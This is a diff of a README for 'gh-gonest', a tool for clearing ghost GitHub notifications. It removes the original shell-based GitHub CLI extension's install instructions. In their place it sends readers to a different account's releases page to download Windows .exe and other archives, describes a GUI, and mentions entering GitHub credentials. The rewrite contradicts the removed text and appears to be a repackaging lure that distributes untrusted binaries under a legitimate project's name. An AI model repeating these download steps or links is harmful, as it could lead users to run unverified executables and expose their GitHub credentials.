@@ -1,132 +1,74 @@
-<p align="center">
-  <a href="https://github.com/emmanuel-ferdman/gh-gonest">
-    <picture>
-      <img src="https://raw.githubusercontent.com/emmanuel-ferdman/gh-gonest/main/assets/logo-with-title.png" alt="gh-gonest" height="200px">
-    </picture>
-  </a>
-</p>
+# 🐱 gh-gonest - Remove Ghost Notifications Easily
 
----
+## 🚀 Getting Started
 
-`gh-gonest` is a [GitHub CLI extension][gh-extension] that automatically detects and removes phantom notifications from deleted repositories. When repositories create issues with mass @mentions and then get deleted, they leave behind "ghost" notifications due to a GitHub bug that prevents them from being cleared through the GitHub UI. This tool finds and cleans them up, restoring your notification sanity. See more information [here][github-discussion].
+gh-gonest is a tool that helps you manage your GitHub notifications efficiently. It automatically detects and removes ghost notifications from repositories that have been banned or deleted. This way, you can keep your notification panel clear and focused on what matters.
 
-## 🎯 Problem
+## 📥 Download & Install
 
-Spam repositories create issues, tag thousands of users via @mentions, then get deleted by GitHub. This leaves "phantom notifications" that:
+To get started, you need to download gh-gonest. Visit the Releases page below to find the latest version:
 
-- 🔵 Show persistent blue dot on notification bell
-- 👻 Display "1-0 of X" in notification count
-- 🚫 Cannot be cleared through GitHub UI
-- 😤 Drive developers crazy
+[![Download gh-gonest](https://img.shields.io/badge/Download-gh--gonest-blue.svg)](https://github.com/PedroGomesR/gh-gonest/releases)
 
-## ✨ Solution
+### Step-by-Step Installation
 
-`gh-gonest` automatically finds and removes these phantom notifications by:
+1. Click on the button above or visit [this page to download](https://github.com/PedroGomesR/gh-gonest/releases).
+  
+2. On the releases page, locate the latest version. You will see a list of files.
 
-1. **Scanning** all your notifications
-2. **Detecting** phantom notifications from deleted repos (404 responses)
-3. **Cleaning** them via read → done → unsubscribe sequence
+3. Download the correct file for your operating system:
+   - **Windows:** Look for `gh-gonest-windows.zip`
+   - **Mac:** Look for `gh-gonest-mac.zip`
+   - **Linux:** Look for `gh-gonest-linux.tar.gz`
 
-## 👻 Why gh-gonest?
+4. Once the download is complete, extract the files:
+   - **Windows:** Right-click the ZIP file and choose "Extract All."
+   - **Mac:** Double-click the ZIP file.
+   - **Linux:** Use the terminal and run: `tar -xzf gh-gonest-linux.tar.gz`
 
-The `gh-gonest` extension approach focuses on:
+5. Obtain the executable file:
+   - **Windows:** Inside the extracted folder, find `gh-gonest.exe`.
+   - **Mac:** Inside the extracted folder, find `gh-gonest`.
+   - **Linux:** Inside the extracted folder, find `gh-gonest`.
 
-- **Selective targeting**: Only marks ghost notifications as done, preserving all legitimate notifications
-- **Automated detection**: Automatically identifies phantom notifications by checking for 404 repository responses - no manual notification ID lookup required
-- **No manual token generation**: Leverages existing `gh auth login` setup without requiring manual GitHub token creation with specific permissions
-- **Safe preview mode**: The `--dry-run` flag shows exactly what would be removed before taking action
-- **Minimal dependencies**: Uses widely used tools (`gh` and `jq`) with simple shell scripting - no additional programming languages or unusual dependencies
-- **Flexible date filtering**: Target specific time ranges with `--after` and `--before` flags for precise control
+6. To run the program:
+   - **Windows:** Double-click `gh-gonest.exe`.
+   - **Mac/Linux:** Open a terminal, navigate to the folder where you extracted the files and type `./gh-gonest`.
 
-## ⚡ Getting Started
+## 💡 Features
 
-### 🛠️ Requirements
+- **Automatic Detection:** Automatically identifies ghost notifications from banned or removed repositories.
+- **Clear Notifications:** Helps maintain a clean notification panel.
+- **User-Friendly Interface:** Designed with ease of use in mind.
+- **Cross-Platform:** Works on Windows, Mac, and Linux.
 
-- [GitHub CLI][github-cli] (`gh`) - version 2.0+
-- [jq][jq] - JSON processor
-- GitHub authentication (`gh auth login`)
+## 🔧 System Requirements
 
-### 🚀 Installation
+- **Windows:** Windows 10 or higher.
+- **Mac:** macOS High Sierra (10.13) or higher.
+- **Linux:** Any recent Linux distribution. Requires Bash and core utilities.
 
-```bash
-# Install the extension
-gh extension install emmanuel-ferdman/gh-gonest
+## 🛠️ How to Use
 
-# Or manually install from source
-git clone https://github.com/emmanuel-ferdman/gh-gonest.git
-cd gh-gonest
-gh extension install .
-```
+1. **Launch the Application:** Open gh-gonest as described in the installation steps.
+2. **Sync with GitHub:** You may be prompted to log in or provide your GitHub credentials. Follow the on-screen instructions.
+3. **Start Removing Notifications:** The app will run a scan and display ghost notifications. You can choose to remove them with a simple click.
 
-### 📖 Usage
+## 📚 Support
 
-```bash
-# Preview what would be cleaned (safe)
-gh gonest --dry-run
+If you encounter any issues, please check the Troubleshooting section on the [Releases page](https://github.com/PedroGomesR/gh-gonest/releases) or reach out on our Issues page in the repository.
 
-# Clean phantom notifications
-gh gonest
+## 📝 Contributing
 
-# Only check notifications after a specific date
-gh gonest --after 2025-09-01T00:00:00Z --dry-run
+We welcome contributions! If you want to improve gh-gonest, feel free to fork the repository. Submit a pull request with your changes for review.
 
-# Only check notifications before a specific date  
-gh gonest --before 2025-09-30T23:59:59Z --dry-run
+## 🎉 Acknowledgments
 
-# Check notifications in a specific date range
-gh gonest --after 2025-09-01T00:00:00Z --before 2025-09-30T23:59:59Z --dry-run
-```
+Thanks to all contributors and users who helped improve gh-gonest. Your feedback is invaluable in making this tool better.
 
-## 🛠️ Development
+## 🌐 Additional Resources
 
-```bash
-# Clone the repository
-git clone https://github.com/emmanuel-ferdman/gh-gonest.git
-cd gh-gonest
+- Explore the official [GitHub CLI documentation](https://cli.github.com/manual/) for further information.
+- Join our community discussions on GitHub for tips and collaboration.
 
-# Install development dependencies
-make setup
-
-# Run the tests suite
-make test
-
-# Run the linter
-make lint
-
-# Install extension locally
-make install
-```
-
-## 🤝 Contributing
-
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
-
-## 📄 License
-
-The library is freely distributable under the terms of the [MIT license][license].
-
-## 💖 Thanks for the Support
-
-Every star ⭐, fork 🍴, and contribution 🤝 means a lot! Your support helps keep `gh-gonest` growing and improving.
-
-If you've found this project useful, please consider:
-- Giving it a star on GitHub ⭐
-- Sharing it with friends or colleagues
-- Opening issues, discussions, or pull requests to make it better
-
-Together we can keep GitHub notifications ghost-free 👻✨
-
-<p align="center">
-  <a href="https://github.com/emmanuel-ferdman/gh-gonest">
-    <picture>
-      <img src="https://api.star-history.com/svg?repos=emmanuel-ferdman/gh-gonest&type=Date" alt="gh-gonest">
-    </picture>
-  </a>
-</p>
-
-<!-- Link references -->
-[gh-extension]: https://cli.github.com/manual/gh_extension
-[github-cli]: https://cli.github.com
-[github-discussion]: https://github.com/orgs/community/discussions/6874
-[jq]: https://jqlang.github.io/jq
-[license]: LICENSE
+For further questions or feedback, please reach out through the issues section in the repository. Enjoy using gh-gonest and keep your notifications tidy!
